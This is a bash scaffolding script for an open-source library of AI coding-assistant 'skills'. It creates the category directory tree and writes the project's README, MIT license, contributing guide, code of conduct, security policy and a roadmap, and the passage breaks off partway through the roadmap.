#!/usr/bin/env bash
set -euo pipefail

# ==============================================================================
# FREE-AI-SKILLS-FOR-DEVELOPERS - Phase 1 Setup & Population Script
#
# This script transforms the repository skeleton into a production-grade,
# model-agnostic developer AI skills library with 132 curated, high-value skills,
# canonical documentation, GitHub templates, and built-in validation checks.
# ==============================================================================

# Safe repository root detection
TARGET_DIR="$(pwd)"
if [[ -d "${TARGET_DIR}/FREE-AI-SKILLS-FOR-DEVELOPERS" ]]; then
    TARGET_DIR="${TARGET_DIR}/FREE-AI-SKILLS-FOR-DEVELOPERS"
    cd "${TARGET_DIR}"
elif [[ "$(basename "${TARGET_DIR}")" != "FREE-AI-SKILLS-FOR-DEVELOPERS" && ! -d "skills" && ! -f "README.md" ]]; then
    mkdir -p FREE-AI-SKILLS-FOR-DEVELOPERS
    cd FREE-AI-SKILLS-FOR-DEVELOPERS
    TARGET_DIR="$(pwd)"
fi

echo "==> Setting up FREE-AI-SKILLS-FOR-DEVELOPERS in: ${TARGET_DIR}"

# 1. Create directory hierarchy
echo "==> Creating Phase 1 directory hierarchy..."
mkdir -p .github/ISSUE_TEMPLATE
mkdir -p docs
mkdir -p templates

mkdir -p skills/agents/coding-agents
mkdir -p skills/agents/coding-agents/patch-generation-and-test-validation
mkdir -p skills/agents/memory
mkdir -p skills/agents/memory/short-and-long-term-context-compaction
mkdir -p skills/agents/multi-agent
mkdir -p skills/agents/multi-agent/supervisor-worker-orchestration
mkdir -p skills/agents/planning
mkdir -p skills/agents/planning/rewoo-task-decomposition
mkdir -p skills/agents/tool-use
mkdir -p skills/agents/tool-use/autonomous-tool-selection-guardrails
mkdir -p skills/agents/workflows
mkdir -p skills/agents/workflows/directed-acyclic-graph-orchestration
mkdir -p skills/ai/ai-evaluation
mkdir -p skills/ai/ai-evaluation/ragas-and-groundedness-benchmarking
mkdir -p skills/ai/embeddings
mkdir -p skills/ai/embeddings/semantic-search-and-reranking
mkdir -p skills/ai/llm-integration
mkdir -p skills/ai/llm-integration/structured-json-output-contracts
mkdir -p skills/ai/multimodal
mkdir -p skills/ai/multimodal/vision-audio-context-orchestration
mkdir -p skills/ai/prompting
mkdir -p skills/ai/prompting/chain-of-thought-system-prompts
mkdir -p skills/ai/rag
mkdir -p skills/ai/rag/retrieval-pipeline-design
mkdir -p skills/ai/structured-output
mkdir -p skills/ai/structured-output/schema-validation-enforcement
mkdir -p skills/ai/tool-calling
mkdir -p skills/ai/tool-calling/robust-tool-use-architecture
mkdir -p skills/api/graphql
mkdir -p skills/api/graphql/schema-design-and-dataloaders
mkdir -p skills/api/grpc
mkdir -p skills/api/grpc/protobuf-schema-evolution
mkdir -p skills/api/rest
mkdir -p skills/api/rest/idempotent-endpoint-design
mkdir -p skills/api/webhooks
mkdir -p skills/api/webhooks/signature-verification-and-delivery
mkdir -p skills/api/websocket
mkdir -p skills/api/websocket/heartbeat-and-reconnection
mkdir -p skills/architecture/clean-architecture
mkdir -p skills/architecture/clean-architecture/onion-and-hexagonal-domain-isolation
mkdir -p skills/architecture/microservices
mkdir -p skills/architecture/microservices/event-driven-eventual-consistency
mkdir -p skills/architecture/scalability
mkdir -p skills/architecture/scalability/horizontal-scaling-and-sharding
mkdir -p skills/architecture/system-design
mkdir -p skills/architecture/system-design/high-availability-and-partitioning
mkdir -p skills/authentication/jwt
mkdir -p skills/authentication/jwt/token-rotation-and-validation
mkdir -p skills/authentication/magic-links
mkdir -p skills/authentication/magic-links/passwordless-email-verification
mkdir -p skills/authentication/oauth
mkdir -p skills/authentication/oauth/pkce-authorization-flow
mkdir -p skills/authentication/passkeys
mkdir -p skills/authentication/passkeys/webauthn-registration-and-login
mkdir -p skills/authentication/permissions
mkdir -p skills/authentication/permissions/rbac-and-abac-policy-engine
mkdir -p skills/authentication/sessions
mkdir -p skills/authentication/sessions/secure-cookie-session-management
mkdir -p skills/automation/browser
mkdir -p skills/automation/browser/headless-browser-automation
mkdir -p skills/automation/github
mkdir -p skills/automation/github/gh-cli-and-api-automation
mkdir -p skills/automation/javascript
mkdir -p skills/automation/javascript/node-automation-scripts
mkdir -p skills/automation/python
mkdir -p skills/automation/python/idempotent-script-automation
mkdir -p skills/automation/shell
mkdir -p skills/automation/shell/posix-compliant-cli-tooling
mkdir -p skills/backend/general
mkdir -p skills/backend/general/rate-limiting-and-resilience
mkdir -p skills/backend/go
mkdir -p skills/backend/go/idiomatic-concurrency-patterns
mkdir -p skills/backend/java
mkdir -p skills/backend/java/spring-boot-domain-service
mkdir -p skills/backend/javascript
mkdir -p skills/backend/javascript/node-event-loop-resilience
mkdir -p skills/backend/php
mkdir -p skills/backend/php/modern-service-container
mkdir -p skills/backend/python
mkdir -p skills/backend/python/fastapi-production-service
mkdir -p skills/backend/rust
mkdir -p skills/backend/rust/safe-error-propagation
mkdir -p skills/backend/typescript
mkdir -p skills/backend/typescript/hexagonal-backend-architecture
mkdir -p skills/cloud/aws
mkdir -p skills/cloud/aws/serverless-event-driven-architecture
mkdir -p skills/cloud/azure
mkdir -p skills/cloud/azure/managed-identity-and-cloud-native
mkdir -p skills/cloud/general
mkdir -p skills/cloud/general/multi-region-disaster-recovery
mkdir -p skills/cloud/google-cloud
mkdir -p skills/cloud/google-cloud/cloud-run-containerized-microservices
mkdir -p skills/database/firebase
mkdir -p skills/database/firebase/firestore-security-and-queries
mkdir -p skills/database/mongodb
mkdir -p skills/database/mongodb/schema-design-and-aggregation
mkdir -p skills/database/mysql
mkdir -p skills/database/mysql/concurrency-and-innodb-locking
mkdir -p skills/database/postgresql
mkdir -p skills/database/postgresql/indexing-and-execution-plans
mkdir -p skills/database/redis
mkdir -p skills/database/redis/caching-invalidation-strategies
mkdir -p skills/database/sql
mkdir -p skills/database/sql/declarative-query-optimization
mkdir -p skills/database/sqlite
mkdir -p skills/database/sqlite/embedded-wal-mode-optimization
mkdir -p skills/database/supabase
mkdir -p skills/database/supabase/row-level-security-policies
mkdir -p skills/debugging/crashes
mkdir -p skills/debugging/crashes/memory-leak-and-heap-dump-investigation
mkdir -p skills/debugging/errors
mkdir -p skills/debugging/errors/stack-trace-and-root-cause-analysis
mkdir -p skills/debugging/performance
mkdir -p skills/debugging/performance/bottleneck-profiling-analysis
mkdir -p skills/debugging/troubleshooting
mkdir -p skills/debugging/troubleshooting/distributed-trace-investigation
mkdir -p skills/devops/ci-cd
mkdir -p skills/devops/ci-cd/pipeline-caching-and-failfast
mkdir -p skills/devops/deployment
mkdir -p skills/devops/deployment/blue-green-and-canary-rollouts
mkdir -p skills/devops/docker
mkdir -p skills/devops/docker/multi-stage-minimal-images
mkdir -p skills/devops/github-actions
mkdir -p skills/devops/github-actions/secure-reusable-workflows
mkdir -p skills/devops/linux
mkdir -p skills/devops/linux/systemd-service-hardening
mkdir -p skills/devops/nginx
mkdir -p skills/devops/nginx/reverse-proxy-and-ssl-hardening
mkdir -p skills/documentation/api-docs
mkdir -p skills/documentation/api-docs/openapi-specification-design
mkdir -p skills/documentation/code-comments
mkdir -p skills/documentation/code-comments/intent-clarification-and-invariants
mkdir -p skills/documentation/readme
mkdir -p skills/documentation/readme/developer-first-readme-architecture
mkdir -p skills/documentation/technical-writing
mkdir -p skills/documentation/technical-writing/architectural-decision-records
mkdir -p skills/frontend/angular
mkdir -p skills/frontend/angular/signals-standalone-components
mkdir -p skills/frontend/css
mkdir -p skills/frontend/css/modern-layout-grid-flex
mkdir -p skills/frontend/html
mkdir -p skills/frontend/html/semantic-markup-and-metadata
mkdir -p skills/frontend/javascript
mkdir -p skills/frontend/javascript/async-event-loop-patterns
mkdir -p skills/frontend/nextjs
mkdir -p skills/frontend/nextjs/app-router-server-components
mkdir -p skills/frontend/react
mkdir -p skills/frontend/react/component-architecture
mkdir -p skills/frontend/svelte
mkdir -p skills/frontend/svelte/runes-reactive-state
mkdir -p skills/frontend/typescript
mkdir -p skills/frontend/typescript/strict-type-contracts
mkdir -p skills/frontend/vue
mkdir -p skills/frontend/vue/composition-api-architecture
mkdir -p skills/game-development/game-design
mkdir -p skills/game-development/game-design/mechanics-dynamics-aesthetics-loop
mkdir -p skills/game-development/godot
mkdir -p skills/game-development/godot/scene-tree-and-signal-architecture
mkdir -p skills/game-development/threejs
mkdir -p skills/game-development/threejs/webgl-performance-and-scene-graphs
mkdir -p skills/game-development/unity
mkdir -p skills/game-development/unity/gameplay-systems-architecture
mkdir -p skills/game-development/unreal-engine
mkdir -p skills/game-development/unreal-engine/gameplay-framework-cpp-blueprints
mkdir -p skills/game-development/web-games
mkdir -p skills/game-development/web-games/canvas-game-loop-architecture
mkdir -p skills/general/best-practices
mkdir -p skills/general/best-practices/solid-and-dry-pragmatism
mkdir -p skills/general/code-generation
mkdir -p skills/general/code-generation/context-rich-code-synthesis
mkdir -p skills/general/code-review
mkdir -p skills/general/code-review/checklist-driven-code-review
mkdir -p skills/general/project-planning
mkdir -p skills/general/project-planning/wbs-and-milestone-decomposition
mkdir -p skills/general/refactoring
mkdir -p skills/general/refactoring/strangler-fig-and-safe-refactoring
mkdir -p skills/git/branching
mkdir -p skills/git/branching/trunk-based-development
mkdir -p skills/git/conflict-resolution
mkdir -p skills/git/conflict-resolution/three-way-merge-conflict-resolution
mkdir -p skills/git/merging
mkdir -p skills/git/merging/fast-forward-and-squash-hygiene
mkdir -p skills/git/rebasing
mkdir -p skills/git/rebasing/interactive-history-cleanup
mkdir -p skills/github/actions
mkdir -p skills/github/actions/secrets-scanning-and-matrix-builds
mkdir -p skills/github/issues
mkdir -p skills/github/issues/actionable-bug-and-feature-templates
mkdir -p skills/github/pull-requests
mkdir -p skills/github/pull-requests/pr-review-and-squash-merge-standards
mkdir -p skills/github/releases
mkdir -p skills/github/releases/semantic-versioning-and-changelog-generation
mkdir -p skills/github/repositories
mkdir -p skills/github/repositories/branch-protection-and-rulesets
mkdir -p skills/logic/algorithms
mkdir -p skills/logic/algorithms/time-space-complexity-optimization
mkdir -p skills/logic/business-logic
mkdir -p skills/logic/business-logic/pure-domain-rules-isolation
mkdir -p skills/logic/error-handling
mkdir -p skills/logic/error-handling/exhaustive-failure-modes
mkdir -p skills/logic/problem-solving
mkdir -p skills/logic/problem-solving/complex-domain-decomposition
mkdir -p skills/logic/state-management
mkdir -p skills/logic/state-management/finite-state-machine-design
mkdir -p skills/logic/validation
mkdir -p skills/logic/validation/declarative-schema-validation
mkdir -p skills/mobile/android/java
mkdir -p skills/mobile/android/java/thread-safe-concurrency-models
mkdir -p skills/mobile/android/jetpack-compose
mkdir -p skills/mobile/android/jetpack-compose/declarative-ui-state
mkdir -p skills/mobile/android/kotlin
mkdir -p skills/mobile/android/kotlin/coroutine-lifecycle-architecture
mkdir -p skills/mobile/android/xml
mkdir -p skills/mobile/android/xml/legacy-constraint-layout-modernization
mkdir -p skills/mobile/flutter
mkdir -p skills/mobile/flutter/bloc-architecture-and-rendering
mkdir -p skills/mobile/ios
mkdir -p skills/mobile/ios/swiftui-navigation-and-state
mkdir -p skills/mobile/react-native
mkdir -p skills/mobile/react-native/new-architecture-bridging
mkdir -p skills/performance/backend
mkdir -p skills/performance/backend/throughput-and-latency-tuning
mkdir -p skills/performance/database
mkdir -p skills/performance/database/slow-query-remediation
mkdir -p skills/performance/frontend
mkdir -p skills/performance/frontend/core-web-vitals-optimization
mkdir -p skills/performance/mobile
mkdir -p skills/performance/mobile/frame-rate-and-battery-budgeting
mkdir -p skills/security/api-security
mkdir -p skills/security/api-security/input-sanitization-and-defense
mkdir -p skills/security/authentication
mkdir -p skills/security/authentication/credential-brute-force-protection
mkdir -p skills/security/authorization
mkdir -p skills/security/authorization/idor-prevention-and-validation
mkdir -p skills/security/secure-coding
mkdir -p skills/security/secure-coding/owasp-top-10-prevention
mkdir -p skills/security/vulnerability-fixing
mkdir -p skills/security/vulnerability-fixing/cve-remediation-workflow
mkdir -p skills/testing/e2e
mkdir -p skills/testing/e2e/deterministic-flow-testing
mkdir -p skills/testing/integration
mkdir -p skills/testing/integration/database-boundary-testing
mkdir -p skills/testing/jest
mkdir -p skills/testing/jest/snapshot-and-mock-discipline
mkdir -p skills/testing/playwright
mkdir -p skills/testing/playwright/resilient-page-object-testing
mkdir -p skills/testing/pytest
mkdir -p skills/testing/pytest/fixtures-and-parameterization
mkdir -p skills/testing/unit
mkdir -p skills/testing/unit/isolated-unit-test-design
mkdir -p skills/testing/vitest
mkdir -p skills/testing/vitest/fast-esm-test-suites
mkdir -p skills/ui/general
mkdir -p skills/ui/general/design-token-system
mkdir -p skills/ui/mobile
mkdir -p skills/ui/mobile/touch-target-layout
mkdir -p skills/ui/web
mkdir -p skills/ui/web/responsive-interface-design
mkdir -p skills/ux/accessibility
mkdir -p skills/ux/accessibility/wcag-contrast-and-focus
mkdir -p skills/ux/design
mkdir -p skills/ux/design/empty-and-error-states
mkdir -p skills/ux/research
mkdir -p skills/ux/research/user-journey-mapping

# 2. Write Root Project Files
echo "==> Writing root project documentation files..."
cat << 'EOF' > README.md
# FREE AI SKILLS FOR DEVELOPERS

> **A curated, production-grade, model-agnostic library of structured AI developer skills designed to transform AI coding assistants into reliable, deterministic software engineering partners.**

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Status: Phase 1](https://img.shields.io/badge/Phase-1_Foundation-green.svg)](ROADMAP.md)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
[![Maintenance](https://img.shields.io/badge/Maintained%3F-yes-green.svg)](https://github.com/FREE-AI-SKILLS-FOR-DEVELOPERS)

---

## Table of Contents

- [The Core Problem](#the-core-problem)
- [What is an AI Skill?](#what-is-an-ai-skill)
- [Why Skills Beat Random Prompts](#why-skills-beat-random-prompts)
- [Repository Architecture](#repository-architecture)
- [Phase 1 Scope](#phase-1-scope)
- [How to Use Skills](#how-to-use-skills)
  - [1. Copy into Chat / Prompt Context](#1-copy-into-chat--prompt-context)
  - [2. System Prompts & Repository Rules (.cursorrules, Copilot, Claude Projects)](#2-system-prompts--repository-rules)
  - [3. Autonomous Agent Loops](#3-autonomous-agent-loops)
- [Practical Walkthrough: Real-World Example](#practical-walkthrough-real-world-example)
- [The Canonical Skill Specification](#the-canonical-skill-specification)
- [Skill Quality Philosophy](#skill-quality-philosophy)
- [Model-Agnostic Philosophy](#model-agnostic-philosophy)
- [Roadmap & Future Phases](#roadmap--future-phases)
- [Contributing](#contributing)
- [Security](#security)
- [License](#license)

---

## The Core Problem

Modern Large Language Models (LLMs) possess vast knowledge across languages, frameworks, and tools. However, when developers interact with models using generic prompts—such as *"Build an auth flow"* or *"Make this fast"*—the output is frequently plagued by:

1. **Vague Generalities**: Hallucinated APIs, boilerplate templates with `stub` comments, and simplistic happy paths.
2. **Security Vulnerabilities**: Lack of input validation, unparameterized database queries, token exposure, and flawed authorization checks.
3. **Architectural Drift**: Inconsistent patterns, premature abstractions, breaking changes, and coupling domain logic to frameworks.
4. **Lack of Verifiability**: No built-in verification criteria, leaving developers to manually test edge cases.

Most prompt collections treat AI as a toy: a grab-bag of one-line prompts producing shallow snippets. Software engineering demands repeatability, edge-case coverage, security rigor, and architectural discipline.

---

## What is an AI Skill?

An **AI Skill** is a structured, version-controlled Markdown specification (`SKILL.md`) that instructs an AI coding assistant on:

- **When to activate**: Explicit triggering scenarios and prerequisites.
- **What context to inspect**: Dependencies, environmental factors, and project conventions to verify before generating code.
- **Step-by-step instructions**: Precise, technology-aware implementation workflows.
- **Hard constraints**: Strict negative rules preventing known security flaws, antipatterns, and breaking changes.
- **Validation checklists**: Verifiable criteria the AI must test before finalizing output.
- **Realistic examples**: Concrete developer scenarios demonstrating real-world execution.

Skills act as **executable engineering guidelines** for AI agents, transforming probabilistic text generation into disciplined software craftsmanship.

---

## Why Skills Beat Random Prompts

| Dimension | Random Generic Prompts | Structured AI Skills |
| :--- | :--- | :--- |
| **Consistency** | Highly variable; changes across turns | Deterministic and repeatable |
| **Context Awareness** | Ignorant of existing repo conventions | Requires pre-inspection of surrounding code |
| **Error Handling** | Frequently omits error paths | Mandates exhaustive failure mode modeling |
| **Security** | Leaves security as an afterthought | Enforces defensive defaults (OWASP, least privilege) |
| **Completeness** | Leaves `stub` placeholders | Requires complete, runnable implementations |
| **Verification** | No built-in validation criteria | Includes concrete, testable validation checklists |

---

## Repository Architecture

The repository is organized into **24 canonical top-level engineering domains**, containing technology groupings and specialized skill directories:

```text
skills/
├── ui/                 # Web, mobile, and design token styling
├── ux/                 # User flows, empty/error UX, accessibility
├── frontend/           # HTML, CSS, JS, TS, React, Next.js, Vue, Angular, Svelte
├── backend/            # Python, JS, TS, Java, Go, Rust, PHP, General
├── logic/              # Problem solving, algorithms, FSMs, validation, error taxonomies
├── database/           # SQL, PostgreSQL, MySQL, MongoDB, SQLite, Supabase, Firebase, Redis
├── api/                # REST, GraphQL, WebSocket, gRPC, Webhooks
├── authentication/     # OAuth PKCE, JWT rotation, Sessions, Passkeys, Magic links, RBAC
├── security/           # OWASP Top 10, brute-force defense, IDOR prevention, CVE remediation
├── testing/            # Unit, integration, E2E, Playwright, Jest, Vitest, Pytest
├── debugging/          # Stack trace analysis, profiling, heap dumps, distributed tracing
├── performance/        # Core Web Vitals, backend latency, slow queries, mobile FPS
├── devops/             # Docker, Linux systemd, Nginx, CI/CD, GitHub Actions, Deployments
├── mobile/             # Android (Kotlin, Java, Compose, XML), Flutter, React Native, iOS
├── game-development/   # Unity, Unreal Engine, Godot, Three.js, Canvas, Game Design
├── ai/                 # Prompting, LLM integration, RAG, embeddings, tools, evaluation
├── agents/             # ReWOO planning, tool guardrails, memory, DAGs, multi-agent
├── automation/         # Python, JS, POSIX Shell, GitHub CLI, Headless Browsers
├── cloud/              # AWS, Azure, Google Cloud, Multi-region DR
├── github/             # Repositories, Issue forms, PR reviews, Actions, SemVer releases
├── git/                # Trunk-based branching, Fast-forward merges, Interactive rebase
├── architecture/       # System design, Clean/Onion architecture, Microservices, Sharding
├── documentation/      # README architecture, OpenAPI 3.1, Intent comments, ADRs
└── general/            # Checklist code reviews, Strangler Fig refactoring, Pragmatic SOLID
```

---

## Phase 1 Scope

Phase 1 establishes a curated foundation of **132 deep, production-grade skills** covering every subcategory in the repository hierarchy. Each skill provides:

- Standardized YAML frontmatter metadata.
- Clear Purpose & Triggering Conditions.
- Required Inputs and Context.
- Actionable, authoritative instructions.
- Strict architectural constraints and guardrails.
- Step-by-step workflow protocols.
- Concrete validation checklists.
- Documented antipatterns and common mistakes.
- Realistic developer scenarios and execution examples.

---

## How to Use Skills

### 1. Copy into Chat / Prompt Context
When working with any AI assistant (ChatGPT, Claude, Gemini, Copilot Chat):
1. Navigate to the relevant skill file (e.g., `skills/api/rest/idempotent-endpoint-design/SKILL.md`).
2. Copy the contents of the `SKILL.md` file.
3. Paste it at the top of your prompt followed by your specific task:

```text
[Paste SKILL.md contents here]

TASK:
I have an Express.js checkout route (`POST /api/orders`) that needs to be
idempotent. Apply the instructions and constraints above to implement
Idempotency-Key header support backed by Redis.
```

### 2. System Prompts & Repository Rules
Incorporate skills directly into your IDE assistant rules:
- **Cursor (`.cursorrules`)**: Append the content of relevant skills into your project's `.cursorrules` file.
- **GitHub Copilot (`.github/copilot-instructions.md`)**: Point Copilot to key skills for architectural adherence.
- **Claude Projects**: Upload relevant skill files as project knowledge files.

### 3. Autonomous Agent Loops
If you are developing or running coding agents (AutoGPT, SWE-bench agents, Claude Computer Use, LangGraph):
- Mount the `skills/` directory into your agent's workspace.
- Allow the agent to dynamically inspect and load skills via file reading tools when executing domain-specific tasks.

---

## Practical Walkthrough: Real-World Example

### Scenario: Eliminating N+1 Queries in a GraphQL API
**Problem**: An existing GraphQL API fetches blog posts and their authors. When a query requests 50 posts, the server executes 51 SQL queries (1 for posts, 50 for authors), causing severe database lock contention.

**Applying the Skill**:
The developer references `skills/api/graphql/schema-design-and-dataloaders/SKILL.md`.

**What the AI does under this skill**:
1. **Context Inspection**: Checks existing schema definitions and database connection handles.
2. **Execution**:
   - Refuses to write inline database queries inside the `author` field resolver.
   - Instantiates a request-scoped `DataLoader` factory in the GraphQL context.
   - Implements a batch loader function querying `WHERE id IN (?)` preserving exact key ordering.
   - Resolves the author field via `context.loaders.authorLoader.load(post.authorId)`.
3. **Validation**: Verifies database query logs confirm exactly 2 SQL queries execute instead of 51.

---

## The Canonical Skill Specification

Every skill follows the canonical specification defined in `templates/SKILL.md`:

```yaml
---
name: kebab-case-name
description: Clear, 1-2 sentence summary of what this skill does and when to use it.
category: category-name
subcategory: subcategory-name
language: target-language (or agnostic)
framework: target-framework (or none)
technology: primary-technology
difficulty: beginner | intermediate | advanced
tags: [tag1, tag2, tag3]
---
```

Followed by structured sections:
- `## Purpose`: Core objective and problem statement.
- `## When to Use`: Explicit activation triggers and scenarios.
- `## Inputs / Context`: Prerequisite data and environmental factors.
- `## Instructions`: Step-by-step imperative guidance.
- `## Constraints / Rules`: Hard negative guardrails.
- `## Workflow`: Execution lifecycle phases.
- `## Expected Output`: Definition of deliverable code/artifacts.
- `## Validation Checklist`: Binary pass/fail verification points.
- `## Common Mistakes & Antipatterns`: What to avoid.
- `## Concrete Real-World Example`: Real developer prompt and solution.

---

## Skill Quality Philosophy

We prioritize **Quality over Quantity**, **Usefulness over Filling Folders**, and **Engineering Rigor over Generic AI Prompts**.

- **No Generic Filler**: A skill that says *"Write clean code and use error handling"* is rejected. Skills must provide concrete technical procedures.
- **Defensive Engineering**: Every skill enforces security guardrails (least privilege, input sanitization, safe error propagation).
- **Zero Placeholders**: All code examples in skills must be complete and runnable.

---

## Model-Agnostic Philosophy

Phase 1 is intentionally **100% model-agnostic**. The skill specifications rely on universal Markdown structures, standard YAML frontmatter, and universal software engineering principles. They work identically across:
- Anthropic Claude (3.5 Sonnet, 3 Opus)
- OpenAI GPT-4, GPT-4o, o1
- Google Gemini (1.5 Pro, 2.0)
- Meta Llama 3/3.1
- Mistral Large & Codestral
- Qwen 2.5 Coder & DeepSeek V3/R1

---

## Roadmap & Future Phases

- **Phase 1 (Current)**: Foundational library of 132 curated, universal developer skills across 24 categories.
- **Phase 2 (Tooling & Validation)**: CLI tool (`skills-cli`), automated linting for `SKILL.md` files, and JSON Schema validation.
- **Phase 3 (Ecosystem & Registry)**: Package manager distribution, VS Code extension, and searchable web portal.
- **Phase 4 (Agent Integration)**: Native adapters for popular agent frameworks (LangGraph, CrewAI, AutoGen).

---

## Contributing

We welcome contributions from engineers across all technical specializations! Please review:
- [CONTRIBUTING.md](CONTRIBUTING.md) for pull request workflows.
- [docs/skill-format.md](docs/skill-format.md) for the skill format specification.
- [docs/contribution-guide.md](docs/contribution-guide.md) for writing and testing skills.

---

## Security

Please review [SECURITY.md](SECURITY.md) for vulnerability reporting guidelines and our security disclosure policy.

---

## License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
EOF

cat << 'EOF' > LICENSE
MIT License

Copyright (c) 2024-2026 Free AI Skills for Developers Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
EOF

cat << 'EOF' > CONTRIBUTING.md
# Contributing to Free AI Skills for Developers

Thank you for your interest in contributing to **FREE AI SKILLS FOR DEVELOPERS**! Our mission is to create the highest quality, open-source collection of structured AI skills to make AI coding assistants reliable and safe engineering partners.

Please take a moment to review this guide before submitting issues or pull requests.

---

## Quality Principles

Before submitting a new skill, ensure it meets our core standards:

1. **Quality > Quantity**: We do not accept shallow, repetitive prompts or generic advice.
2. **Specific & Actionable**: A skill must give concrete, technical, step-by-step instructions.
3. **Defensive & Safe**: A skill must enforce security best practices (least privilege, input validation, no secrets).
4. **Model-Agnostic**: Phase 1 content must not contain vendor-specific hacks or model-specific directory structures.
5. **No Duplication**: Check existing skills before authoring a new one. Specialize only when technologies fundamentally diverge.

---

## Contribution Workflow

### 1. Proposing a New Skill
- Check existing skills in `skills/` to ensure the topic is not already covered.
- Open a GitHub Issue using the **New Skill Proposal** template.
- Explain the domain problem, why a skill is needed, and proposed category/subcategory placement.

### 2. Authoring a Skill
- Copy the canonical template from `templates/SKILL.md`.
- Place the skill in the appropriate category path:
  `skills/<category>/<subcategory>/<skill-slug>/SKILL.md`
- Ensure all required YAML frontmatter fields are present.
- Write complete instructions, constraints, workflows, validation checklists, common mistakes, and realistic examples.
- Ensure zero `stub` or placeholder text.

### 3. Validating the Skill
- Verify Markdown formatting and headings.
- Ensure YAML frontmatter parses as valid YAML.
- Verify the skill follows all rules in [docs/skill-format.md](docs/skill-format.md) and [docs/naming-conventions.md](docs/naming-conventions.md).

### 4. Submitting a Pull Request
- Create a short-lived branch: `git checkout -b feat/add-my-skill`.
- Commit changes using Conventional Commits: `feat(database): add postgresql-partitioning skill`.
- Open a Pull Request referencing the approved issue.
- Complete the PR checklist in `PULL_REQUEST_TEMPLATE.md`.

---

## Code of Conduct

All contributors are expected to uphold the [Contributor Covenant Code of Conduct](CODE_OF_CONDUCT.md).
EOF

cat << 'EOF' > CODE_OF_CONDUCT.md
# Contributor Covenant Code of Conduct

## Our Pledge

We as members, contributors, and leaders pledge to make participation in our
community a harassment-free experience for everyone, regardless of age, body
size, visible or invisible disability, ethnicity, sex characteristics, gender
identity and expression, level of experience, education, socio-economic status,
nationality, personal appearance, race, caste, color, religion, or sexual
identity and orientation.

We pledge to act and interact in ways that contribute to an open, welcoming,
diverse, inclusive, and healthy community.

## Our Standards

Examples of behavior that contributes to a positive environment for our
community include:

* Demonstrating empathy and kindness toward other people
* Being respectful of differing opinions, viewpoints, and experiences
* Giving and gracefully accepting constructive feedback
* Accepting responsibility and apologizing to those affected by our mistakes,
  and learning from the experience
* Focusing on what is best not just for us as individuals, but for the
  overall community

Examples of unacceptable behavior include:

* The use of sexualized language or imagery, and sexual attention or advances of
  any kind
* Trolling, insulting or derogatory comments, and personal or political attacks
* Public or private harassment
* Publishing others' private information, such as a physical or email address,
  without their explicit permission
* Other conduct which could reasonably be considered inappropriate in a
  professional setting

## Enforcement Responsibilities

Community leaders are responsible for clarifying and enforcing our standards of
acceptable behavior and will take appropriate and fair corrective action in
response to any behavior that they deem inappropriate, threatening, offensive,
or harmful.

## Scope

This Code of Conduct applies within all community spaces, including repositories,
issue trackers, pull requests, and community chat channels.

## Attribution

This Code of Conduct is adapted from the [Contributor Covenant](https://www.contributor-covenant.org),
version 2.1.
EOF

cat << 'EOF' > SECURITY.md
# Security Policy

## Reporting Security Issues

We take the security of software generated with and by our skills seriously. If you discover a security vulnerability, an insecure design pattern, or an instruction that encourages dangerous development practices in any skill, please report it responsibly.

**Please do NOT file public GitHub issues for security vulnerabilities.**

Instead, please report security issues via:
- **GitHub Private Vulnerability Reporting**: Use the 'Report a vulnerability' button in the repository Security tab.
- **Security Email**: Contact the maintainers directly at `security@free-ai-skills.org`.

We acknowledge receipt within 48 hours and provide a remediation timeline.

---

## What Constitutes a Security Issue in a Skill?

A skill contains a security vulnerability if:
1. It instructs an AI to generate code susceptible to OWASP Top 10 vulnerabilities (e.g., SQL injection, XSS, SSRF, IDOR).
2. It recommends insecure defaults (e.g., storing raw passwords, unauthenticated mutation endpoints, disabling SSL verification).
3. It promotes vulnerable dependencies or deprecated cryptographic primitives (e.g., MD5, SHA-1 for passwords).
4. It suggests patterns that expose secrets, API keys, or private environment variables in client-side code or public logs.

---

## Defensive Engineering Expectations

All skills in this repository must actively practice **Defense-in-Depth**:
- All database queries must be parameterized.
- All user inputs must be validated at perimeter boundaries.
- All authorization checks must verify tenant and object ownership.
- All authentication tokens must be stored in secure, HttpOnly cookies or encrypted vaults.
- All shell executions must use argument vectors to prevent command injection.
EOF

cat << 'EOF' > ROADMAP.md
# Project Roadmap

This roadmap outlines the phased evolution of **FREE AI SKILLS FOR DEVELOPERS** from foundational library to automated open-source ecosystem.

---

## Phase 1: Foundation & Curated Universal Skills (Current Phase)

**Objective**: Establish a rock-solid, production-grade library of universal developer skills covering core software engineering domains with zero filler.

- [x] Canonical Phase 1 directory hierarchy across 24 domains.
- [x] Canonical `SKILL.md` specification and template.
- [x] Complete documentation: Getting Started, Naming Conventions, Contribution Guide, Skill Format.
- [x] Curated initial foundation of 132 high-value, production-ready developer skills.
- [x] Model-agnostic design validated across Claude, GPT-4, Gemini, and Llama.
- [x] Comprehensive root documentation (README, CONTRIBUTING, SECURITY, CHANGELOG).

---

## Phase 2: Tooling, Linting & Automated Validation (Next Phase)

**Objective**: Provide automated tooling to maintain quality, validate schemas, and facilitate local developer consumption.

- [ ] `skills-cli`: Command-line tool to search, inspect, and copy skills directly into terminal or clipboard.
- [ ] Automated GitHub Actions linter verifying `SKILL.md` YAML frontmatter and required sections.
- [ ] JSON Schema specification for automated skill validation.
- [ ] Automated spell-check and technical reference URL link verification.

---

## Phase 3: IDE Integrations & Ecosystem Distribution

**Objective**: Make skills accessible directly inside developer IDEs and coding workflows.

